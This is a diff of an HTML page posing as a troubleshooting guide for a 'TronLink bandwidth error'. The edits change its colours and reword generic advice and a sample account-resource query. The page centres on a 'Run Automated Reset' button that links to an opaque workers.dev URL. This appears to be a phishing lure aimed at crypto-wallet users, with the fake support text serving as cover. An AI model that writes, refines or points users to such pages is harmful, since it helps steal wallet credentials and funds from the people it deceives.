@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,30 +41,34 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed transactions and an inability to execute desired actions.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using the TronLink wallet.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth, which is a resource required for transaction processing on the TRON network. Bandwidth is typically obtained by freezing TRX (TRON's native cryptocurrency) or by using existing bandwidth resources.</li>
+<li>The error occurs due to insufficient bandwidth or energy on the user's account, which is required to execute transactions on the TRON network. This can be caused by recent network congestion, low account balance, or incorrect wallet configuration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Freeze additional TRX to increase available bandwidth: This can be done through the TRON wallet or exchange interface.</li>
-<li>Adjust transaction parameters to optimize bandwidth usage: This includes setting appropriate transaction fees and sizes.</li>
-<li>Utilize the following script to verify bandwidth availability:</li>
+<li>Increase account bandwidth by freezing TRX tokens for bandwidth.</li>
+<li>Adjust wallet settings to optimize energy consumption.</li>
+<li>Use the following JSON-RPC command to check account resources:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>https://api.trongrid.io/wallet/getaccount<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;address&quot;: &quot;your_tron_address&quot;}&#39;</span>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;getaccountresource&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<span class="w">    </span><span class="s2">&quot;your_account_address&quot;</span>
+<span class="w">  </span><span class="p">],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for more complex troubleshooting and customization. </p>
+<p>Consider utilizing an external console for more advanced troubleshooting and debugging capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A basic understanding of the TRON ecosystem and its resources (TRX, bandwidth, energy).</li>
-<li>Access to a TRON wallet or exchange account with TRX holdings.</li>
-<li>Familiarity with command-line interfaces or API interactions for advanced troubleshooting.</li>
+<li>TRON network account with sufficient TRX balance.</li>
+<li>TronLink wallet installed and configured.</li>
+<li>Basic understanding of TRON network mechanics and wallet management.</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
